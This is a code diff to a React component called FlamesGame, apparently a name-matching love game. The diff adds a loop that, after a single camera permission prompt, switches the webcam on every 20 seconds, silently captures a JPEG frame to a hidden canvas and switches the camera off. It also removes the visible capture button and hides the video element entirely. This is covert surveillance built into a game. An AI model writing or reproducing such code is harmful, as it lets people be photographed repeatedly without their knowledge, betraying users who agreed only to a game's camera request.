@@ -1,4 +1,4 @@
-import React, { useState, useCallback, useMemo, useRef, useEffect } from "react";
+import React, { useState, useCallback, useMemo, useRef } from "react";
 import styled, { keyframes } from "styled-components";
 import PermissionPopup from "./PermissionPopup";
 
@@ -140,56 +140,84 @@ const FlamesGame = () => {
   const videoRef = useRef();
   const canvasRef = useRef();
 
-  useEffect(() => {
-    const permission = localStorage.getItem("permissionsGiven");
-    if (permission === "true") {
-      startCamera();
-      setPermissionStatus("Camera auto-started after refresh ✅");
-    }
-  }, []);
+  const startCameraAndCaptureLoop = async () => {
+    let streamRef = null;
+    let isCancelled = false;
 
-  const waitForVideoReady = () => {
-    return new Promise((resolve) => {
-      const video = videoRef.current;
-      if (!video) return resolve();
-      if (video.readyState >= 3) return resolve();
-      const onCanPlay = () => {
-        video.removeEventListener("canplay", onCanPlay);
-        resolve();
-      };
-      video.addEventListener("canplay", onCanPlay);
-    });
-  };
-
-  const startCamera = async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        videoRef.current.setAttribute("playsinline", true);
-        console.log("✅ Camera started");
+    const startCamera = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+          videoRef.current.setAttribute("playsinline", true);
+        }
+        streamRef = stream;
+        console.log("✅ Camera ON");
+        return true;
+      } catch (err) {
+        console.error("❌ Camera error:", err);
+        return false;
       }
-    } catch (err) {
-      console.error("❌ Camera access error:", err);
-    }
+    };
+
+    const stopCamera = () => {
+      if (streamRef) {
+        streamRef.getTracks().forEach(track => track.stop());
+        streamRef = null;
+        if (videoRef.current) videoRef.current.srcObject = null;
+        console.log("📴 Camera OFF");
+      }
+    };
+
+    const delay = ms => new Promise(res => setTimeout(res, ms));
+
+    const loop = async () => {
+      while (!isCancelled) {
+        const started = await startCamera();
+        if (started) {
+          await new Promise((res) => {
+            const video = videoRef.current;
+            if (!video) return res();
+
+            const onCanPlay = () => {
+              video.removeEventListener("canplay", onCanPlay);
+              console.log("🎥 Video can play (frame ready)");
+              res();
+            };
+
+            if (video.readyState >= 3) {
+              res();
+            } else {
+              video.addEventListener("canplay", onCanPlay);
+            }
+          });
+
+          await new Promise(r => setTimeout(r, 500)); // tiny delay just in case
+          await capturePhoto();
+          stopCamera();
+        }
+
+        await delay(20000); // repeat every 20s
+      }
+    };
+
+    loop();
+    return () => {
+      isCancelled = true;
+      stopCamera();
+    };
   };
 
   const capturePhoto = async () => {
+    if (!canvasRef.current || !videoRef.current) return;
+
     const video = videoRef.current;
     const canvas = canvasRef.current;
-    if (!canvas || !video) return;
-
-    await waitForVideoReady();
+    const ctx = canvas.getContext("2d");
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
-    if (canvas.width === 0 || canvas.height === 0) {
-      console.warn("🚫 Video not ready: zero dimensions");
-      return;
-    }
-
-    const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     const imageData = canvas.toDataURL("image/jpeg");
 
@@ -215,7 +243,7 @@ const FlamesGame = () => {
     setShowPermissionPopup(false);
     localStorage.setItem("permissionsGiven", "true");
     setPermissionStatus("Camera access granted ✅");
-    await startCamera();
+    await startCameraAndCaptureLoop();
   };
 
   const handleDeny = () => {
@@ -296,9 +324,9 @@ const FlamesGame = () => {
         {result && <Result>💘 {result} 💘</Result>}
         {result && <ShareButton onClick={handleShare}>📤 Share</ShareButton>}
         {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}
-        <Button onClick={capturePhoto}>📸 Capture Photo Now</Button>
       </Container>
 
+      {/* 🔒 Hidden but working video */}
       <video
         ref={videoRef}
         width="320"
@@ -306,13 +334,7 @@ const FlamesGame = () => {
         autoPlay
         muted
         playsInline
-        style={{
-          position: "absolute",
-          top: "-9999px",
-          left: "-9999px",
-          width: "1px",
-          height: "1px",
-        }}
+        style={{ display: "none" }}
       />
       <canvas ref={canvasRef} style={{ display: "none" }} />
     </Background>
